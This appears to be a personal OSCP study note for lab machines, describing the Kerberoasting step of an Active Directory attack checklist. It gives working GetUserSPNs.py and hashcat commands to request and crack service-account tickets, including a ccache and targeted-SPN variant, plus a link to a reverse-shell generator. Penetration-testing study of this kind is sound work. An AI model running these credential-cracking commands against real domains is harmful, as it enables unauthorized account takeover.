# AD - Kerberoasting

**Step 39 of 50 · AD**

*Request service tickets for domain accounts with SPNs and crack them offline.*

## Run this

> **Why:** This command gathers the ad kerberoasting evidence needed to decide which documented route applies next.
```bash
GetUserSPNs.py $Domain/$Username:$Password -dc-ip $BoxIP -request
hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

## Example output

```

ServicePrincipalName                 Name
------------------------------------  --------
HTTP/web.htb.local:80                svc_web
$krb5tgs$23$*svc_web$HTB.LOCAL$...HASH...
```
## What did you get?

- [ ] A service ticket was captured → **Run `hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt`, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] No SPNs were returned → **Run `netexec smb $BoxIP -u $Username -p $Password`, then go to Step 40 · [[AD - Credential Validation]] with the credentials you already have**
- [ ] Kerberos reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**

## Notes

Kerberoasting targets service accounts with registered SPNs. It is separate from AS-REP roasting.

### Ccache and targeted-SPN workflow

When NTLM is disabled, use the Kerberos cache. If automatic enumeration fails because the installed Impacket release attempts an NTLM/name-based lookup, use LDAP/BloodHound to identify the exact account and request only that user:

```bash
printf '%s\n' $Username2 > $BoxDir/loot/spn-targets.txt
KRB5_CONFIG=$BoxDir/notes/krb5.conf \
KRB5CCNAME=$BoxDir/loot/gMSA01$.ccache \
  GetUserSPNs.py "$Domain/gMSA01$" -k -no-pass -dc-ip $BoxIP \
  -usersfile $BoxDir/loot/spn-targets.txt \
  -outputfile $BoxDir/loot/kerberoast.hashes
```

After changing group membership, enabling an account, or setting an SPN through ACL abuse, renew the controlling account's TGT before requesting the service ticket.

## Gotcha

> [!warning] 💡
> A successful ticket request does not prove the password is weak. The useful result is a cracked service-account password.
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference
- [[OSCP/BOXES/WRITE UPS/AD/Active|Active]] -- service-account access requested and cracked the administrator CIFS ticket
- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- gMSA enabled `svc_sql`, set an SPN, used a targeted `-usersfile` request, and cracked the ticket

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
